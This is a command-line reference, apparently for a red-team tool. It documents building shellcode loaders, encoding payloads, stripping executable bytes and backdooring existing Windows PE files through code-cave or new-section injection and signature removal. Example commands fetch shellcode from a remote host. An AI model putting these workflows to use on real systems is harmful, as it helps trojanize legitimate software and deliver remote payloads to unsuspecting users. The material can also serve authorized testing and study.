# CLI Reference

```text
washmachine-cli <command> [options]
```

## Commands

| Command | Description |
|---|---|
| `compile` | Build a shellcode loader executable |
| `analyze` | Analyze a PE file (headers, sections, imports, code caves) |
| `strip` | Extract executable bytes to `.bin` payloads |
| `backdoor` | Inject shellcode into an existing PE file |
| `list` | List templates, encoders, snippets, or compilers |
| `provision` | Download/install required external tools (Bin2Shell) |
| `test` | Run the automated test harness |

## compile

Usage:

```text
washmachine-cli compile --shellcode <file> [options]
```

Required input (choose one):

- `--shellcode, -s <file>`
- `--shellcode-hex <hex>`
- `--shellcode-url, -u <url>`

Options:

- `--template, -t <id>` (default: `shellcode-minimal`)
- `--encoder, -e <index>`
- `--envelope, -v <index>`
- `--snippet <key=value>` (repeatable)
- `--verbose`
- `--json`

Examples:

```powershell
washmachine-cli compile -s payload.bin
washmachine-cli compile --shellcode-hex FC4883E4F0... -e 1
washmachine-cli compile -u http://host/shell.bin --verbose
```

## analyze

Usage:

```text
washmachine-cli analyze <pe-file> [--json]
```

## strip

Usage:

```text
washmachine-cli strip <pe-file> [options]
```

Options:

- `-o, --output <file>`
- `-m, --mode <mode>`: `ep | section | all-exec | range`
- `--section <name>`
- `--range <start:len>`
- `--no-trim`
- `--analyze`

## backdoor

Usage:

```text
washmachine-cli backdoor --pe <file> --shellcode <file> [options]
```

Options:

- `--output, -o <file>`
- `--method, -m <method>`: `code-cave | new-section | section-ext`
- `--encryption, --enc <enc>` (reserved)
- `--xor-key <byte>`
- `--carrier, --invoke <mode>`
- `--section-name <name>`
- `--no-remove-sig`
- `--no-patch-subsystem`
- `--no-preserve-entry` (reserved)
- `--no-patch-iat` (reserved)
- `--no-patch-exit`
- `--cave-min-size <n>`
- `--dry-run`
- `--verbose`
- `--json`

## list

Usage:

```text
washmachine-cli list <target>
```

Targets:

- `--templates`
- `--encoders`
- `--snippets`
- `--compilers`

## provision

Usage:

```text
washmachine-cli provision
```

## test

Usage:

```text
washmachine-cli test [options]
```

Examples:

```powershell
washmachine-cli test --shellcode messagebox.bin --phase all
washmachine-cli test --shellcode messagebox.bin --phase 1 --url http://host/payload.bin
washmachine-cli test --phase 3 --test-assets "testing assets\\binary\\shellcodes"
```

::: warning Security Notice
For educational and authorized security testing purposes only.
:::
